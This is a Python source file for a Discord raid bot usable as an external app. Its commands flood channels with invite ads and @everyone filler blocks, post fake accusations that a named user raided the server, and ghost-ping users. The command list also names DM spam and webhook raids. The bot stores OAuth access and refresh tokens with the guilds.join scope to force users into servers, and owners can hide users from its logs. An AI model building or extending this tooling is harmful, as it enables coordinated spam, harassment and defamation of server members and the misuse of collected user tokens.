# language: Python 3.11+, file: bot.py, target: Discord API v10
# pip install -U discord.py requests aiohttp

import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import json
import os
import random
import requests as http_requests
from aiohttp import web
from pathlib import Path
from urllib.parse import urlencode
from datetime import datetime, timezone, timedelta

TOKEN = os.getenv("BOT_TOKEN") or "YOUR_BOT_TOKEN"
CLIENT_ID = os.getenv("CLIENT_ID") or "YOUR_CLIENT_ID"
CLIENT_SECRET = os.getenv("CLIENT_SECRET") or "YOUR_CLIENT_SECRET"
OWNER_ID = int(os.getenv("OWNER_ID") or 0)
OWNER_ID_2 = int(os.getenv("OWNER_ID_2") or 0)
REQUIRED_GUILD_ID = int(os.getenv("REQUIRED_GUILD_ID") or 1560255647608475750)
WHITELIST_ROLE_ID = int(os.getenv("WHITELIST_ROLE_ID") or 1560601333877440542)
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID") or 1560370435797950597)
WHITELIST_LOG_CHANNEL_ID = int(os.getenv("WHITELIST_LOG_CHANNEL_ID") or 1560375659501719623)
ERROR_GUILD_ID = int(os.getenv("ERROR_GUILD_ID") or 1560255647608475750)
ERROR_LOG_CHANNEL_NAME = os.getenv("ERROR_LOG_CHANNEL_NAME") or "errors-logs"
PREFIX = os.getenv("PREFIX") or "/"
REDIRECT_URI = os.getenv("REDIRECT_URI") or "http://localhost:8080/callback"

OWNER_IDS = {uid for uid in (OWNER_ID, OWNER_ID_2) if uid}

INVITE = "https://discord.gg/SKyfbZxzbp"

FLOOD_BLOCK = "\n".join(["\u3164"] * 80) + "\n@here @everyone\n" + INVITE

DATA_FILE = Path("data.json")

intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

bot.tree.allowed_contexts = discord.app_commands.AppCommandContext(guild=True, dm_channel=True, private_channel=True)
bot.tree.allowed_installs = discord.app_commands.AppInstallationType(guild=True, user=True)

def load_data():
    if DATA_FILE.exists():
        raw = json.loads(DATA_FILE.read_text())
    else:
        raw = {}
    wl = raw.get("whitelist", {})
    if isinstance(wl, list):
        wl = {str(uid): "lifetime" for uid in wl}
    raw["whitelist"] = wl
    raw.setdefault("sent_messages", [])
    raw.setdefault("authorized", {})
    raw.setdefault("log_skip", {})
    raw.setdefault("blocked_servers", {})
    return raw

def save_data(data):
    DATA_FILE.write_text(json.dumps(data, indent=2))

data = load_data()

def is_owner_user(user_id: int) -> bool:
    return user_id in OWNER_IDS

def cleanup_whitelist():
    return

def is_whitelisted_user(user_id: int) -> bool:
    if user_id in OWNER_IDS:
        return True
    entry = data.get("whitelist", {}).get(str(user_id))
    if not entry:
        return False
    if entry in ("1", "true", "lifetime", "permanent", True):
        return True
    try:
        exp = datetime.fromisoformat(str(entry))
        if exp.tzinfo is None:
            exp = exp.replace(tzinfo=timezone.utc)
        if exp.year >= 2090:
            return True
        if exp > datetime.now(timezone.utc):
            return True
        data.get("whitelist", {}).pop(str(user_id), None)
        save_data(data)
        return False
    except Exception:
        return bool(entry)

def is_log_skipped(user_id: int) -> bool:
    return str(user_id) in data.get("log_skip", {})

def is_server_blocked(guild_id) -> bool:
    if not guild_id:
        return False
    return str(guild_id) in data.get("blocked_servers", {})

async def grant_whitelist_role(user_id: int):
    guild = bot.get_guild(REQUIRED_GUILD_ID)
    if guild is None:
        print(f"grant_whitelist_role: guild {REQUIRED_GUILD_ID} not found")
        return False
    role = guild.get_role(WHITELIST_ROLE_ID)
    if role is None:
        print(f"grant_whitelist_role: role {WHITELIST_ROLE_ID} not found")
        return False
    member = guild.get_member(user_id)
    if member is None:
        try:
            member = await guild.fetch_member(user_id)
        except Exception as e:
            print(f"grant_whitelist_role: fetch member {user_id}: {e}")
            return False
    if role in member.roles:
        return True
    try:
        await member.add_roles(role, reason="whitelist")
        return True
    except Exception as e:
        print(f"grant_whitelist_role: add_roles failed: {e}")
        try:
            await log_error("grant_whitelist_role", e, extra=f"user={user_id}")
        except Exception:
            pass
        return False

async def revoke_whitelist_role(user_id: int):
    guild = bot.get_guild(REQUIRED_GUILD_ID)
    if guild is None:
        return False
    role = guild.get_role(WHITELIST_ROLE_ID)
    if role is None:
        return False
    member = guild.get_member(user_id)
    if member is None:
        try:
            member = await guild.fetch_member(user_id)
        except Exception:
            return False
    if role not in member.roles:
        return True
    try:
        await member.remove_roles(role, reason="unwhitelist")
        return True
    except Exception as e:
        print(f"revoke_whitelist_role: {e}")
        return False

@bot.tree.interaction_check
async def _global_interaction_check(interaction: discord.Interaction) -> bool:
    gid = interaction.guild_id
    if gid and is_server_blocked(gid):
        if not is_owner_user(interaction.user.id):
            try:
                if not interaction.response.is_done():
                    await interaction.response.send_message(
                        "This bot is disabled in this server.",
                        ephemeral=True,
                    )
            except Exception:
                pass
            return False
    return True

async def must_be_in_required_guild(interaction: discord.Interaction) -> bool:
    if REQUIRED_GUILD_ID == 0:
        return True
    guild = bot.get_guild(REQUIRED_GUILD_ID)
    if guild is None:
        if not interaction.response.is_done():
            await interaction.response.send_message("Required server not found. Bot must be in it.", ephemeral=True)
        return False
    member = guild.get_member(interaction.user.id)
    if member is None:
        try:
            member = await guild.fetch_member(interaction.user.id)
        except:
            member = None
    if member is None:
        if not interaction.response.is_done():
            await interaction.response.send_message(
                f"You must be in the required server to use this bot.\n{INVITE}",
                ephemeral=True
            )
        return False
    return True

async def resolve_channel(interaction: discord.Interaction):
    if interaction.channel_id:
        cached = bot.get_channel(interaction.channel_id)
        if cached is not None:
            return cached
        try:
            return await bot.fetch_channel(interaction.channel_id)
        except Exception as e:
            print(f"fetch_channel failed: {e}")
    return None

async def public_send(interaction: discord.Interaction, content: str):
    if len(content) > 2000:
        content = content[:1997] + "..."
    channel = await resolve_channel(interaction)
    if channel is not None:
        try:
            msg = await channel.send(content)
            data.setdefault("sent_messages", []).append({
                "channel_id": msg.channel.id,
                "message_id": msg.id,
                "via": "channel",
            })
            save_data(data)
            return msg
        except Exception as e:
            print(f"channel.send failed, falling back to followup: {e}")

    msg = await interaction.followup.send(content, ephemeral=False)
    try:
        data.setdefault("sent_messages", []).append({
            "channel_id": interaction.channel_id,
            "message_id": msg.id,
            "via": "followup",
        })
        save_data(data)
    except Exception as e:
        print(f"track followup failed: {e}")
    return msg

async def log_command(interaction: discord.Interaction, command_name: str, extra: str = None):
    if is_owner_user(interaction.user.id):
        return
    if is_log_skipped(interaction.user.id):
        return
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if channel is None:
        try:
            channel = await bot.fetch_channel(LOG_CHANNEL_ID)
        except Exception as e:
            print(f"log_command: cannot reach log channel {LOG_CHANNEL_ID}: {e}")
            return

    guild = interaction.guild
    guild_id = interaction.guild_id
    channel_obj = interaction.channel
    channel_id = interaction.channel_id

    if guild is not None:
        guild_name = guild.name
        context_label = "Guild"
    elif guild_id:
        guild_name = f"(partial) id={guild_id}"
        context_label = "Guild (external/partial)"
    else:
        guild_name = "DM / User Install"
        context_label = "DM / External App"
        guild_id = 0

    channel_name = getattr(channel_obj, "name", None) or getattr(channel_obj, "recipient", None)
    if channel_name is None:
        channel_name = "unknown"
    else:
        channel_name = str(channel_name)

    ctx_bits = []
    try:
        ctx = interaction.context
        if ctx is not None:
            if getattr(ctx, "guild", False) or getattr(ctx, "guild_install", False):
                ctx_bits.append("guild_install")
            if getattr(ctx, "private_channel", False) or getattr(ctx, "user_install", False):
                ctx_bits.append("user_install")
            if getattr(ctx, "dm_channel", False):
                ctx_bits.append("dm")
    except Exception:
        pass
    try:
        ai = getattr(interaction, "authorizing_integration_owners", None)
        if ai:
            ctx_bits.append(f"auth_owners={dict(ai)}")
    except Exception:
        pass

    embed = discord.Embed(title="Command Log", color=0x2B2D31, timestamp=datetime.now(timezone.utc))
    embed.add_field(name="User", value=f"<@{interaction.user.id}>\n`{interaction.user}`", inline=True)
    embed.add_field(name="Command", value=f"`/{command_name}`", inline=True)
    embed.add_field(name="Context", value=context_label, inline=True)
    embed.add_field(name="Server", value=f"{guild_name}\n`{guild_id}`", inline=False)
    embed.add_field(name="Channel", value=f"#{channel_name}\n`{channel_id}`", inline=False)
    if ctx_bits:
        embed.add_field(name="Install / Flags", value=", ".join(ctx_bits)[:1024], inline=False)
    if extra:
        embed.add_field(name="Details", value=str(extra)[:1024], inline=False)
    embed.set_footer(text=f"User ID: {interaction.user.id}")
    if interaction.user.display_avatar:
        embed.set_thumbnail(url=interaction.user.display_avatar.url)

    try:
        await channel.send(embed=embed)
    except Exception as e:
        print(f"log_command send failed: {e}")

async def log_whitelist(action: str, moderator: discord.User, target: discord.User, minutes: int = None):
    channel = bot.get_channel(WHITELIST_LOG_CHANNEL_ID)
    if channel is None:
        try:
            channel = await bot.fetch_channel(WHITELIST_LOG_CHANNEL_ID)
        except Exception as e:
            print(f"whitelist log channel fetch failed: {e}")
            return

    color = 0x57F287 if action == "add" else 0xED4245
    title = "Whitelist Added" if action == "add" else "Whitelist Removed"

    embed = discord.Embed(title=title, color=color, timestamp=datetime.now(timezone.utc))
    embed.add_field(name="Moderator", value=f"<@{moderator.id}>", inline=True)
    embed.add_field(name="Target", value=f"<@{target.id}>", inline=True)
    if minutes is not None:
        embed.add_field(name="Duration", value=f"{minutes} minutes", inline=True)
    else:
        embed.add_field(name="Duration", value="lifetime", inline=True)
    embed.set_footer(text=f"Mod: {moderator.id} | Target: {target.id}")

    try:
        await channel.send(embed=embed)
    except Exception as e:
        print(f"whitelist log failed: {e}")

def scramble_text(text: str) -> str:
    chars = list(text)
    letters = [(i, c) for i, c in enumerate(chars) if c.isalpha()]
    if len(letters) < 2:
        return text
    indices = [i for i, _ in letters]
    pool = [c for _, c in letters]
    random.shuffle(pool)
    for idx, ch in zip(indices, pool):
        chars[idx] = ch
    return "".join(chars)

async def log_error(source: str, error: Exception | str, extra: str = None):
    guild = bot.get_guild(ERROR_GUILD_ID)
    if guild is None:
        print(f"log_error: guild {ERROR_GUILD_ID} not found")
        return
    channel = discord.utils.get(guild.text_channels, name=ERROR_LOG_CHANNEL_NAME)
    if channel is None:
        for ch in guild.text_channels:
            if ch.name.lower() == ERROR_LOG_CHANNEL_NAME.lower():
                channel = ch
                break
    if channel is None:
        print(f"log_error: channel '{ERROR_LOG_CHANNEL_NAME}' not found in guild {ERROR_GUILD_ID}")
        return

    err_str = str(error)
    embed = discord.Embed(title="Error Log", color=0xED4245, timestamp=datetime.now(timezone.utc))
    embed.add_field(name="Source", value=f"`{source}`", inline=True)
    embed.add_field(name="Error", value=f"```{err_str[:900]}```", inline=False)
    if extra:
        embed.add_field(name="Details", value=extra[:1024], inline=False)
    try:
        await channel.send(embed=embed)
    except Exception as e:
        print(f"log_error send failed: {e}")

def build_invite_link():
    params = {"client_id": CLIENT_ID, "permissions": "8", "scope": "bot applications.commands"}
    return f"https://discord.com/api/oauth2/authorize?{urlencode(params)}"

def build_user_auth_link():
    params = {
        "client_id": CLIENT_ID,
        "response_type": "code",
        "redirect_uri": REDIRECT_URI,
        "scope": "identify guilds.join",
    }
    return f"https://discord.com/api/oauth2/authorize?{urlencode(params)}"

class StopSpamView(discord.ui.View):
    def __init__(self, stop_event: asyncio.Event):
        super().__init__(timeout=300)
        self.stop_event = stop_event

    @discord.ui.button(label="STOP", style=discord.ButtonStyle.danger)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.stop_event.set()
        button.disabled = True
        await interaction.response.edit_message(content="Stopping spam...", view=self)
        self.stop()

@bot.event
async def on_ready():
    print(f"logged in as {bot.user} | {bot.user.id}")
    print(f"owners: {OWNER_IDS}")
    print(f"required guild: {REQUIRED_GUILD_ID}")
    print(f"in {len(bot.guilds)} guild(s)")
    for g in bot.guilds:
        print(f"  - {g.name} ({g.id})")

    try:
        synced = await bot.tree.sync()
        print(f"global sync: {len(synced)} command(s)")
    except Exception as e:
        print(f"global sync failed: {e}")

    for g in bot.guilds:
        try:
            bot.tree.copy_global_to(guild=g)
            synced = await bot.tree.sync(guild=g)
            print(f"guild sync [{g.name}]: {len(synced)} command(s)")
        except Exception as e:
            print(f"guild sync failed [{g.name}]: {e}")

    if hasattr(bot, "refresh_status_panel"):
        try:
            await bot.refresh_status_panel()
        except Exception as e:
            print(f"status refresh on_ready: {e}")

    try:
        await start_oauth_server()
    except Exception as e:
        print(f"oauth server start failed: {e}")

@bot.tree.command(name="sync", description="Force re-sync slash commands (owner only)")
async def sync_cmd(interaction: discord.Interaction):
    if not is_owner_user(interaction.user.id):
        return await interaction.response.send_message("Owner only.", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    await log_command(interaction, "sync")
    try:
        synced_global = await bot.tree.sync()
        lines = [f"Global: **{len(synced_global)}** commands."]
        ok, fail = 0, 0
        for g in list(bot.guilds):
            try:
                bot.tree.copy_global_to(guild=g)
                await bot.tree.sync(guild=g)
                ok += 1
            except Exception as e:
                fail += 1
                print(f"sync guild {g.name} ({g.id}): {e}")
        lines.append(f"Guilds: **{ok}** ok, **{fail}** fail.")
        names = [c.name for c in bot.tree.get_commands()]
        lines.append(f"Tree: `{', '.join(sorted(names))}`")
        await interaction.followup.send("\n".join(lines), ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"Sync error: `{e}`", ephemeral=True)

@bot.tree.command(name="link", description="Send the bot invite / user auth link")
async def link(interaction: discord.Interaction):
    if not await must_be_in_required_guild(interaction):
        return
    await log_command(interaction, "link")
    bot_url = build_invite_link()
    user_url = build_user_auth_link()
    await interaction.response.send_message(
        f"**Bot invite:**\n{bot_url}\n\n**User authorize (for force-join):**\n{user_url}",
        ephemeral=True
    )

@bot.tree.command(name="adspam", description="Flood the channel with big join ads")
@app_commands.describe(amount="How many messages (1-50, default 20)")
async def adspam(interaction: discord.Interaction, amount: int = 20):
    if not await must_be_in_required_guild(interaction):
        return
    amount = max(1, min(int(amount), 50))

    await interaction.response.send_message("running...", ephemeral=True)
    await log_command(interaction, "adspam", extra=f"Amount: {amount}")

    msg = (
        "## Got fucked? Join us today..\n"
        "https://discord.gg/SKyfbZxzbp\n"
        "## WHITELIST UR SERVER! WITH US."
    )

    try:
        for _ in range(amount):
            await public_send(interaction, msg)
            await asyncio.sleep(0.5)
    except Exception as e:
        await log_error("adspam", e)
        try:
            await interaction.followup.send(f"Send failed: `{e}`", ephemeral=True)
        except:
            pass

@bot.tree.command(name="test", description="Test send + delete (checks external app perms)")
async def test(interaction: discord.Interaction):
    if not await must_be_in_required_guild(interaction):
        return

    await interaction.response.send_message("testing...", ephemeral=True)
    await log_command(interaction, "test")

    try:
        msg = await public_send(interaction, "bot online")
        await asyncio.sleep(1.5)
        try:
            await msg.delete()
        except Exception as e:
            print(f"delete failed (ok if external-only): {e}")
        await interaction.followup.send("PASS — message sent.", ephemeral=True)
    except Exception as e:
        await log_error("test", e)
        await interaction.followup.send(f"FAIL — `{e}`", ephemeral=True)

whitelist_group = app_commands.Group(
    name="whitelist",
    description="Whitelist users or block servers (owner only)",
)

@whitelist_group.command(name="user", description="Permanent whitelist a user (owner only)")
@app_commands.describe(member="User to whitelist (lifetime)")
async def whitelist_user(interaction: discord.Interaction, member: discord.User):
    if not await must_be_in_required_guild(interaction):
        return
    if not is_owner_user(interaction.user.id):
        return await interaction.response.send_message("Owner only.", ephemeral=True)

    data.setdefault("whitelist", {})[str(member.id)] = "lifetime"
    save_data(data)

    role_ok = await grant_whitelist_role(member.id)

    await log_command(interaction, "whitelist user", extra=f"Target: <@{member.id}>\nDuration: lifetime\nRole: {role_ok}")
    await log_whitelist("add", interaction.user, member, minutes=None)
    extra = "" if role_ok else " (role add failed — check bot perms / role hierarchy)"
    await interaction.response.send_message(
        f"Whitelisted {member.mention} **for life**{extra}.",
        ephemeral=True,
    )

@whitelist_group.command(name="server", description="Block the bot in a server (owner only)")
@app_commands.describe(server_id="Guild ID to block — bot will refuse all commands there")
async def whitelist_server(interaction: discord.Interaction, server_id: str):
    if not await must_be_in_required_guild(interaction):
        return
    if not is_owner_user(interaction.user.id):
        return await interaction.response.send_message("Owner only.", ephemeral=True)

    try:
        gid = int(server_id.strip())
    except ValueError:
        return await interaction.response.send_message("Invalid server ID.", ephemeral=True)

    blocked = data.setdefault("blocked_servers", {})
    key = str(gid)
    if key in blocked:
        return await interaction.response.send_message(
            f"Server `{gid}` is **already blocked**. Use `/unwhitelist server` to remove.",
            ephemeral=True,
        )
    blocked[key] = {
        "by": interaction.user.id,
        "at": datetime.now(timezone.utc).isoformat(),
    }
    save_data(data)
    await log_command(interaction, "whitelist server", extra=f"Blocked guild: `{gid}`")
    await interaction.response.send_message(
        f"Server `{gid}` is now **blocked**. The bot will not work there.",
        ephemeral=True,
    )

bot.tree.add_command(whitelist_group)

@bot.tree.command(name="logwhitelist", description="Exclude a user from command logs (owner only)")
@app_commands.describe(member="User who will not appear in command logs")
async def logwhitelist(interaction: discord.Interaction, member: discord.User):
    if not await must_be_in_required_guild(interaction):
        return
    if not is_owner_user(interaction.user.id):
        return await interaction.response.send_message("Owner only.", ephemeral=True)

    skip = data.setdefault("log_skip", {})
    uid = str(member.id)
    if uid in skip:
        del skip[uid]
        save_data(data)
        await log_command(interaction, "logwhitelist", extra=f"Removed skip: <@{member.id}>")
        return await interaction.response.send_message(
            f"{member.mention} is **back in the logs**.",
            ephemeral=True,
        )
    skip[uid] = True
    save_data(data)
    await log_command(interaction, "logwhitelist", extra=f"Added skip: <@{member.id}>")
    await interaction.response.send_message(
        f"{member.mention} will **no longer appear** in command logs. Run again to undo.",
        ephemeral=True,
    )

unwhitelist_group = app_commands.Group(
    name="unwhitelist",
    description="Remove user whitelist or server block (owner only)",
)

@unwhitelist_group.command(name="user", description="Remove a user from the whitelist (owner only)")
@app_commands.describe(member="User to unwhitelist")
async def unwhitelist_user(interaction: discord.Interaction, member: discord.User):
    if not await must_be_in_required_guild(interaction):
        return
    if not is_owner_user(interaction.user.id):
        return await interaction.response.send_message("Owner only.", ephemeral=True)
    data.get("whitelist", {}).pop(str(member.id), None)
    save_data(data)
    await revoke_whitelist_role(member.id)
    await log_command(interaction, "unwhitelist user", extra=f"Target: <@{member.id}>")
    await log_whitelist("remove", interaction.user, member)
    await interaction.response.send_message(f"Unwhitelisted {member.mention}", ephemeral=True)

@unwhitelist_group.command(name="server", description="Unblock a server (owner only)")
@app_commands.describe(server_id="Guild ID to unblock")
async def unwhitelist_server(interaction: discord.Interaction, server_id: str):
    if not await must_be_in_required_guild(interaction):
        return
    if not is_owner_user(interaction.user.id):
        return await interaction.response.send_message("Owner only.", ephemeral=True)
    try:
        gid = int(server_id.strip())
    except ValueError:
        return await interaction.response.send_message("Invalid server ID.", ephemeral=True)
    removed = data.get("blocked_servers", {}).pop(str(gid), None)
    save_data(data)
    if not removed:
        return await interaction.response.send_message(
            f"Server `{gid}` was not blocked.",
            ephemeral=True,
        )
    await log_command(interaction, "unwhitelist server", extra=f"Unblocked guild: `{gid}`")
    await interaction.response.send_message(
        f"Server `{gid}` is **unblocked**. Bot works there again.",
        ephemeral=True,
    )

bot.tree.add_command(unwhitelist_group)

@bot.tree.command(name="blame", description="Send a fake blame message")
@app_commands.describe(member="User to blame (optional)")
async def blame(interaction: discord.Interaction, member: discord.User = None):
    if not await must_be_in_required_guild(interaction):
        return

    target = member or interaction.user
    await interaction.response.send_message("sent", ephemeral=True)
    await log_command(interaction, "blame", extra=f"Target: <@{target.id}>")

    try:
        await public_send(interaction, f"**{target.mention}** just raided this server. Report them.")
    except Exception as e:
        await log_error("blame", e)
        await interaction.followup.send(f"Send failed: `{e}`", ephemeral=True)

@bot.tree.command(name="ghostping", description="Ghost ping a user")
@app_commands.describe(member="User to ghost ping")
async def ghostping(interaction: discord.Interaction, member: discord.User):
    if not await must_be_in_required_guild(interaction):
        return

    await interaction.response.send_message("sent", ephemeral=True)
    await log_command(interaction, "ghostping", extra=f"Target: <@{member.id}>")

    try:
        msg = await public_send(interaction, member.mention)
        await asyncio.sleep(0.6)
        try:
            await msg.delete()
        except Exception as e:
            print(f"ghostping delete failed: {e}")
    except Exception as e:
        await log_error("ghostping", e)
        await interaction.followup.send(f"Send failed: `{e}`", ephemeral=True)

@bot.tree.command(name="help", description="List commands you can use")
async def help_cmd(interaction: discord.Interaction):
    if not await must_be_in_required_guild(interaction):
        return

    uid = interaction.user.id
    owner = is_owner_user(uid)
    wl = is_whitelisted_user(uid)

    catalog = [
        ("help", "List commands available to you", "all"),
        ("link", "Get bot invite + user-auth links", "all"),
        ("test", "Test send + delete in this channel", "all"),
        ("adspam", "Flood the channel with join ads", "all"),
        ("roast", "Roast a user (optional amount)", "all"),
        ("blame", "Send a fake blame message", "all"),
        ("ghostping", "Ghost ping a user", "all"),
        ("spam", "Spam the channel (STOP button)", "wl"),
        ("editspam", "Send then scramble-edit a message", "wl"),
        ("flood", "Flood with long empty blocks", "wl"),
        ("dmspam", "DM-spam a user", "wl"),
        ("webhookraid", "Spam a webhook URL (no bot in target server)", "wl"),
        ("status", "Post live bot status panel (auto-updates)", "owner"),
        ("sync", "Force re-sync slash commands", "owner"),
        ("whitelist user", "Permanent whitelist a user", "owner"),
        ("whitelist server", "Block the bot in a server", "owner"),
        ("unwhitelist user", "Remove user from whitelist", "owner"),
        ("unwhitelist server", "Unblock a server", "owner"),
        ("logwhitelist", "Hide a user from command logs (toggle)", "owner"),
        ("die", "Delete tracked bot messages", "owner"),
        ("serverjoin", "Force-join authorized users into a guild", "owner"),
    ]

    lines = []
    for name, desc, access in catalog:
        if access == "owner" and not owner:
            continue
        if access == "wl" and not (wl or owner):
            continue
        lines.append(f"**`/{name}`** — {desc}")

    level = "Owner" if owner else ("Whitelist" if wl else "Member")
    embed = discord.Embed(
        title=f"Help — {level}",
        description="\n".join(lines) if lines else "No commands available.",
        color=0x2B2D31,
    )
    embed.set_footer(text=f"Slash · {len(lines)} command(s)")

    await interaction.response.send_message(embed=embed, ephemeral=True)
    await log_command(interaction, "help")

# ===== OAuth callback + welcome DMs =====
AUTH_WELCOME_DM = (
    "Welcome to Slash hope you enjoy you're stay, to use the bot you must join the server below!\n"
    "{mention}\n"
    "https://discord.gg/Swg688n2kC"
)

JOIN_WELCOME_DM = (
    "Welcome in Slash, best external app existing.\n"
    "Add bot to a server with —> https://discord.com/api/oauth2/authorize?client_id=1560307448177229854&permissions=8&scope=bot+applications.commands\n"
    "Add bot to ur apps to use as an external —> https://discord.com/api/oauth2/authorize?client_id=1560307448177229854&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A8080%2Fcallback&scope=identify+guilds.join"
)

async def _dm_user(user_id: int, content: str):
    try:
        user = bot.get_user(user_id) or await bot.fetch_user(user_id)
        await user.send(content)
        return True
    except Exception as e:
        print(f"DM failed {user_id}: {e}")
        return False

async def oauth_callback(request: web.Request):
    code = request.rel_url.query.get("code")
    if not code:
        return web.Response(text="Missing code. Authorize again.", status=400)

    try:
        token_r = http_requests.post(
            "https://discord.com/api/v10/oauth2/token",
            data={
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": REDIRECT_URI,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15,
        )
        token_data = token_r.json()
        if "access_token" not in token_data:
            print(f"oauth token error: {token_data}")
            return web.Response(text=f"Token error: {token_data}", status=400)

        access = token_data["access_token"]
        refresh = token_data.get("refresh_token")
        me_r = http_requests.get(
            "https://discord.com/api/v10/users/@me",
            headers={"Authorization": f"Bearer {access}"},
            timeout=10,
        )
        me = me_r.json()
        uid = str(me["id"])

        data.setdefault("authorized", {})[uid] = {
            "access_token": access,
            "refresh_token": refresh,
            "username": f"{me.get('username', '?')}#{me.get('discriminator', '0')}",
            "authorized_at": datetime.now(timezone.utc).isoformat(),
        }
        save_data(data)
        print(f"oauth authorized: {uid} {me.get('username')}")

        mention = f"<@{uid}>"
        await _dm_user(int(uid), AUTH_WELCOME_DM.format(mention=mention))

        return web.Response(
            text="Authorized. Check your DMs — join the server to use the bot.",
            content_type="text/plain",
        )
    except Exception as e:
        print(f"oauth_callback error: {e}")
        try:
            await log_error("oauth_callback", e)
        except Exception:
            pass
        return web.Response(text=f"Error: {e}", status=500)

async def start_oauth_server():
    app = web.Application()
    app.router.add_get("/callback", oauth_callback)
    runner = web.AppRunner(app)
    await runner.setup()
    port = 8080
    try:
        from urllib.parse import urlparse
        p = urlparse(REDIRECT_URI)
        if p.port:
            port = p.port
    except Exception:
        pass
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"oauth callback server on 0.0.0.0:{port}  redirect={REDIRECT_URI}")

@bot.event
async def on_member_join(member: discord.Member):
    target_id = REQUIRED_GUILD_ID
    if target_id and member.guild.id != target_id:
        return
    if member.bot:
        return
    try:
        await member.send(JOIN_WELCOME_DM)
        print(f"join DM sent to {member.id}")
    except Exception as e:
        print(f"join DM failed {member.id}: {e}")

_BASE = Path(__file__).resolve().parent

try:
    _extra = (_BASE / "extra_cmds.py").read_text(encoding="utf-8")
    exec(_extra, globals())
    print("extra_cmds loaded")
except Exception as _e:
    print(f"extra_cmds load failed: {_e}")

try:
    import importlib.util
    _spec = importlib.util.spec_from_file_location("status_panel", _BASE / "status_panel.py")
    _mod = importlib.util.module_from_spec(_spec)
    _spec.loader.exec_module(_mod)
    _mod.setup_status(
        bot,
        is_owner_user=is_owner_user,
        log_command=log_command,
        data=data,
        save_data=save_data,
    )
    print("status_panel loaded")
except Exception as _e:
    print(f"status_panel load failed: {_e}")

try:
    import importlib.util
    _spec = importlib.util.spec_from_file_location("webhook_cmd", _BASE / "webhook_cmd.py")
    _mod = importlib.util.module_from_spec(_spec)
    _spec.loader.exec_module(_mod)
    _mod.setup(
        bot,
        must_be_in_required_guild=must_be_in_required_guild,
        is_whitelisted_user=is_whitelisted_user,
        log_command=log_command,
        log_error=log_error,
    )
    print("webhook_cmd loaded")
except Exception as _e:
    print(f"webhook_cmd load failed: {_e}")

bot.run(TOKEN)
